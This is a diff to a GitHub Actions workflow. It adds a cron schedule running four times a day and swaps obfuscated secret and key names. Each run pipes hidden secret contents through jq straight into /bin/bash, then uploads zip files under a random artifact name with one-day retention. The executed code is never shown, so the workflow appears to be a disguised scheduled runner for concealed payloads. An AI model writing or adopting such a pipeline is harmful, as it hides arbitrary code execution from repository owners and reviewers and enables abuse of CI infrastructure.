@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '22 1,7,13,19 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,16 +14,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          rqb426: ${{ secrets.rqb426 }}
+          jqg04797: ${{ secrets.jqg04797 }}
         run: |
-          printf '%s' "$rqb426" | jq -r .dbwwa22933 | /bin/bash
-          echo $c777 | jq -r .gx913 | /bin/bash
-          printf '%s' "$m2991" | jq -r .pxa11652 | /bin/bash
-          printf '%s' "$l377" | jq -r .gsjc73959 | /bin/bash
+          printf '%s' "$jqg04797" | jq -r .vdj1 | /bin/bash
+          printf '%s' "$jd29" | jq -r .yp0140 | /bin/bash
+          printf '%s' "$bme02015" | jq -r .asoyz9 | /bin/bash
+          printf '%s' "$tiqh742" | jq -r .wview973 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: d4AcuYFy
+          name: CzYIp885
           path: "*.zip"
           retention-days: 1
